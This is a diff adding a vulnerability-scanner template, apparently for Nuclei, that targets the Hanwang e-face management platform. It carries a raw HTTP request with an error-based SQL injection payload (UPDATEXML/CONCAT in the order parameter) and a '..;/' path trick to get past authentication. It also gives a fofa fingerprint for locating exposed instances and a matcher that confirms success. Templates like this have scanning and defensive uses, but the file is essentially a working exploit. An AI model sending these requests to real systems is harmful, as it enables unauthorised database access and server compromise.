@@ -1,0 +1,27 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code == 200 && contains (body,'qqjpq1qpkvq')
+          name: SQL注入
+          type: dsl
+      raw:
+        - |
+          GET /manage/dgmCommand/finishRegister.do/..;/..;/systemBlackList/queryBlackList.do?page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+          Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+          Accept-Encoding: gzip, deflate, br
+          Connection: keep-alive
+          Pragma: no-cache
+          Cache-Control: no-cache
+id: Hanwang-queryBlackList-sql
+info:
+    author: HuanXiong
+    description: |-
+        fofa: icon_hash="1380907357"
+        汉王e脸通综合管理平台 queryBlackList.do 接口存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
+    name: 汉王e脸通综合管理平台 queryBlackList.do SQL注入
+    reference:
+        - null
+    severity: high
+    tags: []
